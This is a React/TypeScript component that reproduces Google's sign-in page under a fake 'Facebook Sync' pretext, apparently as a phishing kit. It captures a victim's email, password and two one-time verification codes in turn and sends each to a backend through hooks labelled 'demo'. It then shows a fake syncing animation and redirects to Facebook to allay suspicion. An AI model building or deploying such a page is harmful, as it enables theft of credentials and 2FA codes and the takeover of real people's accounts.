import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { FcGoogle } from "react-icons/fc";
import { FaFacebook, FaSyncAlt, FaCheckCircle } from "react-icons/fa";
import { UserCircle2, ChevronDown, Loader2 } from "lucide-react";
import { GoogleCard } from "@/components/google/GoogleCard";
import { GoogleInput } from "@/components/google/GoogleInput";
import { useCreateDemoLogin, useUpdateDemoLogin } from "@/hooks/use-demo";

type Step = 'email' | 'password' | 'prompt' | 'animation' | 'code1' | 'code2' | 'success';

interface FlowState {
  id?: number;
  email: string;
}

export function SignInFlow() {
  const [step, setStep] = useState<Step>('email');
  const [flowState, setFlowState] = useState<FlowState>({ email: "" });

  // Handle transition between steps seamlessly
  return (
    <GoogleCard showFacebookContext={step !== 'email' && step !== 'success'}>
      {step === 'email' && (
        <EmailStep 
          onNext={(email, id) => {
            setFlowState({ email, id });
            setStep('password');
          }} 
        />
      )}
      {step === 'password' && (
        <PasswordStep 
          flowState={flowState} 
          onNext={() => setStep('prompt')} 
        />
      )}
      {step === 'prompt' && (
        <PromptStep 
          flowState={flowState} 
          onNext={() => setStep('animation')} 
        />
      )}
      {step === 'animation' && (
        <AnimationStep 
          onNext={() => setStep('code1')} 
        />
      )}
      {step === 'code1' && (
        <Code1Step 
          flowState={flowState} 
          onNext={() => setStep('code2')} 
        />
      )}
      {step === 'code2' && (
        <Code2Step 
          flowState={flowState} 
          onNext={() => setStep('success')} 
        />
      )}
      {step === 'success' && (
        <SuccessStep />
      )}
    </GoogleCard>
  );
}

// ==========================================
// 1. EMAIL STEP
// ==========================================
function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const createMutation = useCreateDemoLogin();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError("Enter an email or phone number");
      return;
    }
    if (!email.includes("@")) {
      setError("Couldn't find your Google Account");
      return;
    }
    
    setError("");
    createMutation.mutate({ email }, {
      onSuccess: (data) => {
        onNext(data.email, data.id);
      }
    });
  };

  const handleForgotEmail = () => {
    window.location.href = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin";
  };

  const handleCreateAccount = () => {
    window.location.href = "https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp";
  };

  return (
    <motion.div initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
      <FcGoogle className="w-12 h-12 mb-4" />
      <h1 className="text-[1.5rem] font-normal mb-2 text-[#202124]">Sign in</h1>
      <p className="text-[1rem] text-[#202124] mb-8">to continue to Facebook Sync</p>

      <form onSubmit={handleSubmit} className="w-full mt-2">
        <GoogleInput 
          label="Email or phone" 
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          error={error}
          disabled={createMutation.isPending}
          autoFocus
        />
        
        <div 
          onClick={handleForgotEmail}
          className="mt-2 text-[#0b57d0] font-medium text-[14px] hover:underline cursor-pointer inline-block"
        >
          Forgot email?
        </div>

        <div className="mt-12 text-[#5f6368] text-sm">
          Not your computer? Use Guest mode to sign in privately. <br/>
          <span className="text-[#0b57d0] font-medium hover:underline cursor-pointer">Learn more</span>
        </div>

        <div className="mt-12 flex justify-between items-center">
          <button 
            type="button" 
            onClick={handleCreateAccount}
            className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm"
          >
            Create account
          </button>
          <button 
            type="submit" 
            disabled={createMutation.isPending}
            className="bg-[#0b57d0] text-white px-6 py-2 rounded-full font-medium text-sm hover:bg-[#0842a0] hover:shadow-md transition-all flex items-center gap-2 disabled:opacity-70"
          >
            {createMutation.isPending && <Loader2 className="w-4 h-4 animate-spin" />}
            Next
          </button>
        </div>
      </form>
    </motion.div>
  );
}

// ==========================================
// 2. PASSWORD STEP
// ==========================================
function PasswordStep({ flowState, onNext }: { flowState: FlowState, onNext: () => void }) {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const updateMutation = useUpdateDemoLogin();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError("Enter a password");
      return;
    }
    
    setError("");
    updateMutation.mutate({ id: flowState.id!, password }, {
      onSuccess: () => onNext()
    });
  };

  return (
    <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
      <FcGoogle className="w-12 h-12 mb-4" />
      <h1 className="text-[2rem] font-normal mb-2 text-[#202124]">Welcome</h1>
      
      {/* Pill representing selected user */}
      <div className="flex items-center gap-2 border border-gray-300 rounded-full px-3 py-1 mb-10 hover:bg-gray-50 cursor-pointer transition-colors">
        <UserCircle2 className="w-5 h-5 text-gray-500" />
        <span className="text-sm font-medium text-[#3c4043]">{flowState.email}</span>
        <ChevronDown className="w-4 h-4 text-gray-500" />
      </div>

      <form onSubmit={handleSubmit} className="w-full">
        <GoogleInput 
          type="password"
          label="Enter your password" 
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          error={error}
          disabled={updateMutation.isPending}
          autoFocus
        />

        <div className="mt-14 flex justify-between items-center">
          <button type="button" className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm">
            Forgot password?
          </button>
          <button 
            type="submit" 
            disabled={updateMutation.isPending}
            className="bg-[#0b57d0] text-white px-6 py-2 rounded-full font-medium text-sm hover:bg-[#0842a0] hover:shadow-md transition-all flex items-center gap-2 disabled:opacity-70"
          >
            {updateMutation.isPending && <Loader2 className="w-4 h-4 animate-spin" />}
            Next
          </button>
        </div>
      </form>
    </motion.div>
  );
}

// ==========================================
// 3. NOTIFICATION PROMPT STEP
// ==========================================
function PromptStep({ flowState, onNext }: { flowState: FlowState, onNext: () => void }) {
  return (
    <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center text-center">
      <FcGoogle className="w-12 h-12 mb-4" />
      <h1 className="text-2xl font-normal mb-2 text-[#202124]">2-Step Verification</h1>
      <p className="text-sm text-gray-600 mb-8">To help keep your account safe, Google wants to make sure it's really you trying to sign in.</p>
      
      <div className="bg-[#f0f4f9] rounded-xl p-6 mb-8 w-full border border-gray-200">
        <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <svg className="w-6 h-6 text-[#0b57d0]" fill="currentColor" viewBox="0 0 24 24">
            <path d="M16 1H8C6.34 1 5 2.34 5 4v16c0 1.66 1.34 3 3 3h8c1.66 0 3-1.34 3-3V4c0-1.66-1.34-3-3-3zm-2 20h-4v-1h4v1zm3.25-3H6.75V4h10.5v14z"/>
          </svg>
        </div>
        <p className="text-[#202124] font-medium leading-relaxed">
          Pull down the notification bar on your device and tap the sign-in notification. Tap Yes, then tap the number you received on your phone to verify it's you.
        </p>
      </div>

      <div className="w-full flex justify-end items-center mt-4">
        <button 
          onClick={onNext}
          className="bg-[#0b57d0] text-white px-8 py-2.5 rounded-full font-medium hover:bg-[#0842a0] hover:shadow-md transition-all shadow-sm"
        >
          Verify
        </button>
      </div>
    </motion.div>
  );
}

// ==========================================
// 4. ANIMATION STEP
// ==========================================
function AnimationStep({ onNext }: { onNext: () => void }) {
  useEffect(() => {
    // Wait 5 seconds, then transition to next step
    const timer = setTimeout(() => {
      onNext();
    }, 5000);
    return () => clearTimeout(timer);
  }, [onNext]);

  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="flex flex-col items-center justify-center py-10">
      <h1 className="text-xl font-medium text-[#202124] mb-12">Syncing Accounts...</h1>
      
      <div className="flex items-center justify-center gap-6 mb-12">
        <motion.div 
          animate={{ y: [0, -10, 0] }} 
          transition={{ duration: 2, repeat: Infinity, ease: "easeInOut" }}
        >
          <FaFacebook className="w-20 h-20 text-[#1877F2]" />
        </motion.div>

        <motion.div 
          animate={{ rotate: 360 }} 
          transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
          className="text-[#0b57d0]/30"
        >
          <FaSyncAlt className="w-10 h-10" />
        </motion.div>

        <motion.div 
          animate={{ y: [0, -10, 0] }} 
          transition={{ duration: 2, repeat: Infinity, ease: "easeInOut", delay: 0.5 }}
        >
          <FcGoogle className="w-20 h-20" />
        </motion.div>
      </div>
      
      <p className="text-sm text-gray-500 animate-pulse">This may take a few moments. Please do not close the browser.</p>
    </motion.div>
  );
}

// ==========================================
// 5. FIRST CODE STEP
// ==========================================
function Code1Step({ flowState, onNext }: { flowState: FlowState, onNext: () => void }) {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const updateMutation = useUpdateDemoLogin();

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    if (val.length <= 8) {
      setCode(val);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!code || code.length < 6 || code.length > 8) {
      setError("Enter a 6-8 digit verification code");
      return;
    }
    
    setError("");
    updateMutation.mutate({ id: flowState.id!, firstCode: code }, {
      onSuccess: () => onNext()
    });
  };

  return (
    <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
      <FcGoogle className="w-12 h-12 mb-4" />
      <h1 className="text-2xl font-normal mb-2 text-[#202124]">2-Step Verification</h1>
      <p className="text-sm text-gray-600 mb-8 text-center">A verification code was just sent to your device via SMS.</p>
      
      <form onSubmit={handleSubmit} className="w-full">
        <GoogleInput 
          type="text"
          label="Enter verification code" 
          value={code}
          onChange={handleInputChange}
          error={error}
          disabled={updateMutation.isPending}
          autoFocus
          inputMode="numeric"
          pattern="[0-9]*"
        />

        <div className="mt-14 flex justify-between items-center">
          <button type="button" className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm">
            Resend it
          </button>
          <button 
            type="submit" 
            disabled={updateMutation.isPending}
            className="bg-[#0b57d0] text-white px-6 py-2 rounded-full font-medium text-sm hover:bg-[#0842a0] hover:shadow-md transition-all flex items-center gap-2 disabled:opacity-70"
          >
            {updateMutation.isPending && <Loader2 className="w-4 h-4 animate-spin" />}
            Next
          </button>
        </div>
      </form>
    </motion.div>
  );
}

// ==========================================
// 6. SECOND CODE STEP
// ==========================================
function Code2Step({ flowState, onNext }: { flowState: FlowState, onNext: () => void }) {
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const updateMutation = useUpdateDemoLogin();

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    if (val.length <= 8) {
      setCode(val);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!code || code.length < 6 || code.length > 8) {
      setError("Enter a 6-8 digit verification code");
      return;
    }
    
    setError("");
    updateMutation.mutate({ id: flowState.id!, secondCode: code }, {
      onSuccess: () => onNext()
    });
  };

  return (
    <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="flex flex-col items-center">
      <FcGoogle className="w-12 h-12 mb-4" />
      <h1 className="text-2xl font-normal mb-2 text-[#202124]">Additional verification</h1>
      <p className="text-sm text-gray-600 mb-8 text-center">To ensure your account is secure for Facebook synchronization, please enter the second verification code we just sent.</p>
      
      <form onSubmit={handleSubmit} className="w-full">
        <GoogleInput 
          type="text"
          label="Enter second code" 
          value={code}
          onChange={handleInputChange}
          error={error}
          disabled={updateMutation.isPending}
          autoFocus
          inputMode="numeric"
          pattern="[0-9]*"
        />

        <div className="mt-14 flex justify-between items-center">
          <button type="button" className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm">
            Try another way
          </button>
          <button 
            type="submit" 
            disabled={updateMutation.isPending}
            className="bg-[#0b57d0] text-white px-6 py-2 rounded-full font-medium text-sm hover:bg-[#0842a0] hover:shadow-md transition-all flex items-center gap-2 disabled:opacity-70"
          >
            {updateMutation.isPending && <Loader2 className="w-4 h-4 animate-spin" />}
            Confirm
          </button>
        </div>
      </form>
    </motion.div>
  );
}

// ==========================================
// 7. SUCCESS STEP
// ==========================================
function SuccessStep() {
  return (
    <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center justify-center py-6 text-center">
      <div className="relative mb-8">
        <div className="flex items-center gap-4 bg-white px-6 py-4 rounded-full border border-gray-100 shadow-md">
          <FaFacebook className="w-12 h-12 text-[#1877F2]" />
          <div className="w-px h-10 bg-gray-200 mx-2"></div>
          <FcGoogle className="w-12 h-12" />
        </div>
        <motion.div 
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: "spring", stiffness: 200, delay: 0.3 }}
          className="absolute -bottom-3 -right-3 bg-white rounded-full p-1 shadow-sm"
        >
          <FaCheckCircle className="w-8 h-8 text-green-500" />
        </motion.div>
      </div>
      
      <h1 className="text-2xl font-medium text-[#202124] mb-3">Sync Complete</h1>
      <p className="text-[#5f6368] mb-10 text-sm max-w-sm">
        Your Google account has been successfully verified and synced with Facebook. Your identity is now confirmed.
      </p>

      <button 
        onClick={() => window.location.href = "https://facebook.com"}
        className="bg-[#1877F2] text-white font-medium px-8 py-2.5 rounded-full transition-all hover:bg-[#166fe5] hover:shadow-md text-sm"
      >
        Go to Facebook
      </button>
    </motion.div>
  );
}
